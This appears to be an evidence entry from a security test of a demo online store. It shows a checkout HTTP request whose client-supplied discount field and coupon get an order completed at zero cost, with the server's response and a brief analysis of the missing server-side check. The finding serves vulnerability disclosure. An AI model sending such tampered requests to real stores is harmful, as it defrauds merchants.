## Evidence: coupon-100-discount — 100% Discount Coupon Abuse

### Request
POST /api/v1/orders/checkout HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json
Authorization: Bearer eyJ...

{"items":[{"id":1,"quantity":1}],"coupon":"FREEDUCK100","discount":"100"}

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"order_id":99,"total":0.00,"discount_applied":"100%","coupon":"FREEDUCK100","status":"completed","checkout":"success"}

### Analysis
The checkout endpoint accepts a coupon with 100 percent discount without server-side validation of the discount amount.
